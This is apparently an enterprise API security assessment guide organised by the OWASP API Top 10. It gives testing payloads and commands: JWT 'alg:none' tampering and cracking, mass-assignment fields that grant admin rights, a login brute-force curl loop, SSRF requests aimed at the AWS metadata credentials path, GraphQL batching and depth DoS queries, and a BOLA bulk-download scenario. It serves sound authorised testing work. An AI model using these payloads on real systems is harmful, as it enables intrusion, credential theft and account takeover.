# API Security - Enterprise Assessment Guide

## OWASP API Security Top 10 (2023)

### API1:2023 – Broken Object Level Authorization (BOLA/IDOR)

**Most Critical API Vulnerability**

#### Detection Strategy
```bash
# Test object references in API endpoints
GET /api/v1/users/123 → Change to 124, 125, etc.
GET /api/v1/documents/{uuid} → Enumerate UUIDs
GET /api/v1/orders/{id} → Test sequential IDs
```

#### Automation
```python
# Burp Intruder payloads
1, 2, 3, ..., 1000 (Sniper attack)
# Check for 200 OK on unauthorized objects
```

**Severity:** CRITICAL (direct data exposure)

---

### API2:2023 – Broken Authentication

#### Common Weaknesses
1. **JWT Vulnerabilities**
   ```json
   {
     "alg": "none",  // Algorithm set to "none"
     "typ": "JWT"
   }
   ```
   - Change `"alg": "HS256"` → `"alg": "none"`
   - Try weak secrets: `secret`, `key`, `password`
   - Test JWT expiration bypass

2. **API Key Exposure**
   - Check GitHub repos: `api_key`, `API_KEY`, `X-API-Key`
   - Browser localStorage/sessionStorage
   - JavaScript source code

3. **OAuth Misconfigurations**
   - Missing `state` parameter (CSRF)
   - Open redirect after authentication
   - Insufficiently random tokens

---

### API3:2023 – Broken Object Property Level Authorization

#### Mass Assignment Attack
```json
// Normal user registration
{
  "username": "attacker",
  "email": "test@example.com"
}

// Add admin privilege
{
  "username": "attacker",
  "email": "test@example.com",
  "role": "admin",          // Injected
  "isAdmin": true,          // Injected
  "privileges": ["*"]       // Injected
}
```

**Testing Methodology:**
1. Capture legitimate API request
2. Add extra fields: `role`, `isAdmin`, `permissions`, `is_verified`
3. Check if server accepts and processes them

---

### API4:2023 – Unrestricted Resource Consumption

#### Rate Limiting Tests
```bash
# Brute force detection
for i in {1..1000}; do
  curl -X POST https://api.example.com/login \
    -d '{"username":"admin","password":"test'$i'"}' &
done

# Check for:
# - 429 Too Many Requests (good)
# - Continued 200/401 responses (vulnerable)
```

#### GraphQL Query Complexity
```graphql
# Nested query DoS
{
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              # ... 10 levels deep
            }
          }
        }
      }
    }
  }
}
```

**Impact:** Service degradation, credential stuffing, resource exhaustion

---

### API5:2023 – Broken Function Level Authorization

#### Privilege Escalation
```bash
# User role
GET /api/v1/profile → 200 OK (authorized)

# Try admin endpoints
GET /api/v1/admin/users → 403 Forbidden (expected)
GET /api/v1/users?admin=true → 200 OK (vulnerable!)

# HTTP method tampering
GET /api/v1/users → 200 OK
POST /api/v1/users → 403 Forbidden
PUT /api/v1/users → 200 OK (vulnerable!)
```

**Test Matrix:**
| Endpoint | GET | POST | PUT | DELETE | PATCH |
|----------|-----|------|-----|--------|-------|
| `/users` | ✓   | ✗    | ?   | ?      | ?     |
| `/admin` | ✗   | ✗    | ?   | ?      | ?     |

---

### API6:2023 – Unrestricted Access to Sensitive Business Flows

#### Business Logic Exploitation
```python
# Example: E-commerce discount abuse
1. Add item ($100) to cart
2. Apply 10% discount code → $90
3. Apply 20% discount code → $72
4. Repeat until price = $0

# Racing condition in payment
Thread 1: POST /checkout (use $100 credit)
Thread 2: POST /checkout (use same $100 credit)
# If both succeed, you spent $100 but got $200 worth
```

**Detection:** Look for missing idempotency keys, transaction locking

---

### API7:2023 – Server Side Request Forgery (SSRF)

#### API-Specific SSRF
```bash
# Webhook URL injection
POST /api/webhooks
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}

# Import from URL feature
POST /api/import
{
  "source": "http://localhost:6379/"  # Redis
}

# PDF generation services
POST /api/pdf
{
  "html": "<img src='http://internal-admin.local/secrets'>"
}
```

**AWS Metadata Extraction:**
```bash
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
```

---

### API8:2023 – Security Misconfiguration

#### Common Misconfigurations
1. **CORS Wildcard**
   ```http
   Access-Control-Allow-Origin: *
   Access-Control-Allow-Credentials: true
   ```
   → Allows any domain to make authenticated requests

2. **Verbose Error Messages**
   ```json
   {
     "error": "SQL Error: SELECT * FROM users WHERE id=1' -- ",
     "stack": "/var/www/api/users.php:42"
   }
   ```

3. **Unnecessary HTTP Methods**
   ```bash
   OPTIONS /api/users HTTP/1.1
   # Response:
   Allow: GET, POST, PUT, DELETE, TRACE, OPTIONS
   ```
   → `TRACE` can leak cookies, `DELETE` may allow data destruction

4. **Exposed Documentation**
   - `/api/docs`, `/api/swagger.json`
   - `/api/graphql` (GraphQL introspection)
   - `/.well-known/openapi.json`

---

### API9:2023 – Improper Inventory Management

#### Discovery Techniques
```bash
# Find undocumented API versions
/api/v1/users
/api/v2/users  # New version
/api/v0/users  # Legacy version (often less secure!)

# Common API paths
/api/, /api/v1/, /api/v2/, /rest/, /graphql/, /v1/, /v2/
/swagger.json, /openapi.json, /api-docs

# Subdomain enumeration
api.example.com
api-dev.example.com  # Dev environment exposed!
api-staging.example.com
api-internal.example.com
```

**Nuclei Templates:**
```bash
nuclei -u https://example.com -t exposures/apis/
```

---

### API10:2023 – Unsafe Consumption of APIs

#### Third-Party API Risks
```python
# Blindly trusting external API response
external_data = requests.get("https://third-party.api/data").json()
User.create(
    username=external_data['username'],  # No sanitization!
    role=external_data['role']           # Privilege escalation risk
)
```

**Testing:**
- Check if app validates data from external APIs
- Test for SSRF when app fetches from user-provided URLs
- Look for XML/JSON deserialization of untrusted data

---

## REST API Testing Checklist

- [ ] **Authentication**
  - [ ] JWT signature verification
  - [ ] API key exposure in URLs/logs
  - [ ] Token expiration enforcement
  - [ ] OAuth flow security

- [ ] **Authorization**
  - [ ] IDOR/BOLA testing on all endpoints
  - [ ] Horizontal privilege escalation
  - [ ] Vertical privilege escalation
  - [ ] Function-level access control

- [ ] **Input Validation**
  - [ ] SQL injection (all parameters)
  - [ ] NoSQL injection (MongoDB, etc.)
  - [ ] XSS in JSON responses
  - [ ] Command injection via API parameters

- [ ] **Rate Limiting**
  - [ ] Login endpoint (credential stuffing)
  - [ ] Password reset (account takeover)
  - [ ] Resource-intensive operations
  - [ ] Registration endpoints (spam)

- [ ] **Configuration**
  - [ ] CORS policy
  - [ ] HTTP methods allowed
  - [ ] Error message verbosity
  - [ ] API documentation exposure

---

## GraphQL-Specific Testing

### Introspection Query
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```
→ If this works, you have full schema disclosure

### Batching Attack (Rate Limit Bypass)
```graphql
[
  { "query": "{ user(id: 1) { email } }" },
  { "query": "{ user(id: 2) { email } }" },
  # ... 1000 queries in one request
]
```

### Depth-Based DoS
```graphql
{
  user(id: 1) {
    posts {
      author {
        posts {
          author {
            # 20 levels deep
          }
        }
      }
    }
  }
}
```

---

## gRPC API Testing

### Reflection API
```bash
# List services
grpcurl -plaintext localhost:50051 list

# Describe service
grpcurl -plaintext localhost:50051 describe ServiceName
```

### Common Issues
- Missing authentication on gRPC endpoints
- Insecure transport (plaintext instead of TLS)
- Verbose error messages

---

## Tools & Automation

### Essential Tools
- **Postman/Insomnia** - Manual testing
- **Burp Suite** - Interception & fuzzing
- **ffuf/wfuzz** - API endpoint discovery
- **nuclei** - Automated vulnerability scanning
- **graphqlmap** - GraphQL exploitation
- **jwt_tool** - JWT analysis & exploitation

### Automated Testing
```bash
# API fuzzing with ffuf
ffuf -u https://api.example.com/FUZZ \
     -w api-endpoints.txt \
     -H "Authorization: Bearer TOKEN"

# GraphQL introspection
graphqlmap -u https://api.example.com/graphql --introspect

# JWT cracking
jwt_tool TOKEN -C -d wordlist.txt
```

---

## Real-World API Exploitation Scenarios

### Scenario 1: BOLA → Data Breach
```
1. GET /api/invoices/123 (my invoice) → 200 OK
2. GET /api/invoices/124 (not mine) → 200 OK (vulnerable!)
3. Script to download all invoices 1-10000
4. Result: Full customer database leaked
```

### Scenario 2: Mass Assignment → Admin Access
```
1. POST /api/register {"username":"hacker","email":"x@x.com"}
2. Add: {"role":"admin","isVerified":true}
3. Server accepts extra fields
4. Result: Instant admin account
```

### Scenario 3: GraphQL Batching → Account Takeover
```
1. Endpoint: /graphql (password reset)
2. Batch 10,000 OTP guesses in single request
3. Rate limiting bypassed (sees 1 request, not 10k)
4. Result: Account takeover via OTP brute force
```

---

## References
- OWASP API Security Top 10: https://owasp.org/API-Security/
- HackerOne API Reports: https://hackerone.com/hacktivity?querystring=api
- PortSwigger API Testing: https://portswigger.net/web-security/api-testing
